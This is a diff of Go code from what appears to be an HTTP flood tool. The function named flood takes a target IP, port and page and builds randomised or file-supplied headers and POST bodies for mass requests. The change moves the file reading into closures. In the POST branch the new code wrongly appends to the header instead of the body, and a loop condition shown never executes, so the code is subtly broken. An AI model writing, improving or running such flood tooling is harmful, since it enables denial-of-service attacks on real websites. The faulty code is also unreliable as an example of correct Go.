@@ -130,38 +130,42 @@ func flood(ip, port, page, mode string) {
 			header += acceptall[rand.Intn(len(acceptall))]
 			header += referers[rand.Intn(len(referers))] + "\r\n"
 		} else {
-			fi, err := os.Open(os.Args[7])
-			if err != nil {
-				fmt.Printf("Error: %s\n", err)
-				return
-			}
-			defer fi.Close()
-			br := bufio.NewReader(fi)
-			for {
-				a, _, c := br.ReadLine()
-				if c == io.EOF {
-					break
+			func() {
+				fi, err := os.Open(os.Args[7])
+				if err != nil {
+					fmt.Printf("Error: %s\n", err)
+					return
 				}
-				header += string(a) + "\r\n"
-			}
+				defer fi.Close()
+				br := bufio.NewReader(fi)
+				for {
+					a, _, c := br.ReadLine()
+					if c == io.EOF {
+						break
+					}
+					header += string(a) + "\r\n"
+				}
+			}()
 		}
 	} else if mode == "post" {
 		data := ""
 		if os.Args[7] != "nil" {
-			fi, err := os.Open(os.Args[7])
-			if err != nil {
-				fmt.Printf("Error: %s\n", err)
-				return
-			}
-			defer fi.Close()
-			br := bufio.NewReader(fi)
-			for {
-				a, _, c := br.ReadLine()
-				if c == io.EOF {
-					break
+			func() {
+				fi, err := os.Open(os.Args[7])
+				if err != nil {
+					fmt.Printf("Error: %s\n", err)
+					return
 				}
-				data += string(a) + "\r\n"
-			}
+				defer fi.Close()
+				br := bufio.NewReader(fi)
+				for {
+					a, _, c := br.ReadLine()
+					if c == io.EOF {
+						break
+					}
+					header += string(a) + "\r\n"
+				}
+			}()
 
 		} else {
 			for x := 0; x > 100; x++ {
